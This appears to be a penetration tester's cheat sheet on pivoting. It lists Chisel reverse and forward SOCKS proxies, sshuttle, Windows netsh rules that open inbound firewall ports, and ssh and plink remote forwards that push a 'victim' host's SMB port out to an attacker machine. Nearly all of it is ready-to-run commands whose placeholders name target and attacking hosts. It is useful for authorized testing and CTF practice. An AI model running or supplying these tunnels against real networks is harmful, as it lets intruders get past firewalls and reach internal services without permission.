# Tunneling / Port Forwarding / Pivoting  
Gain further access into a network or expose local services   

[Pivot cheat sheet](https://assets.contentstack.io/v3/assets/blt36c2e63521272fdc/blt0f228a4b9a1165e4/5ef3d602395b554cb3523e7b/pivot-cheat-sheet-v1.0.pdf) 

 Expose internal services, usually hidden due to firewall rules or gain further access into a network. 

 ## Chisel 
[Chisel](https://github.com/jpillora/chisel) 
Good for getting through firewalls, need correct copies of binaries on both target / attack box  
Need to change /etc/proxychains4.conf socks4 to socks5 on attack box 
### Chisel socks Reverse Proxy 
    attack    ./chisel server -p LISTEN_PORT --reverse &  
    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
### Chisel socks Forward Proxy 
    target    ./chisel server -p LISTEN_PORT --socks5  
    attack    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
### Chisel Remote Port Forward 
    attack    ./chisel server -p LISTEN_PORT --reverse &  
    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & 
### Chisel Local Port Forward 
    target    ./chisel server -p LISTEN_PORT 
    attack    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT 
 
 # Linux Port Forwarding 
  If pivot is a Linux box with python installed you can ssh into: can use [sshuttle](https://github.com/sshuttle/sshuttle) to connect into network. 
  
      sshuttle -r user@10.10.10.10 --ssh-cmd "ssh -i id_rsa" 10.10.0.0/24
 
 
 
 # Windows Port Forwarding 
     netsh firewall show config 
     netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT      
## SSH (Window 10 and newer)
     [from target box to expose SMB ]
     ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
## Plink.exe
     [upload plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)  
     plink.exe -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS   <-note entering in your password on a victim box is a bad idea
     
     [generate ssh keys on kali, convert to putty keys and then upload with plink.exe to target ] 
     sudo apt install putty-tools 
     puttygen KEYFILE -o OUTPUT_KEY.ppk 
     cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N 

